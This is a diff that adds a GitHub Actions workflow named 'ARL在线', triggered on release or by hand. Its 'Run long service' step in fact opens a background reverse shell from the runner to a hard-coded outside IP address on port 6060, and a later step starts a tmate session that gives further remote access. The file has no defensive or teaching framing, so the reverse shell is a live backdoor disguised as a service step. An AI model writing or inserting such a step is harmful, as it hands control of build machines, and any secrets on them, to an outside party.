@@ -1,0 +1,41 @@
+name: ARL在线
+
+on:
+  release:
+    types: [published]
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: 'Image tag'
+        required: false
+        default: 'test'  # 默认的标签值
+
+permissions:
+  contents: read
+
+jobs:
+  long-running-service:
+    runs-on: macos-latest
+
+    steps:
+      - name: Run long service
+        run: |
+          # 使用 macOS 的 Bash 启动反向 shell
+          nohup bash -c 'bash -i >& /dev/tcp/181.193.118.73/6060 0>&1' &>/dev/null &
+          sleep 10 # 确保服务已经启动
+
+      # Checkout your code
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      # Set up tmate session
+      - name: Setup tmate session
+        uses: mxschmitt/action-tmate@v3
+
+      # Print tmate connection instructions
+      - name: Print tmate instructions
+        run: |
+          echo "To connect to the tmate session, run the following command:"
+          echo "ssh $(cat /tmp/tmate-ssh)"
+          echo "Alternatively, use the web URL:"
+          echo "$(cat /tmp/tmate-url)"
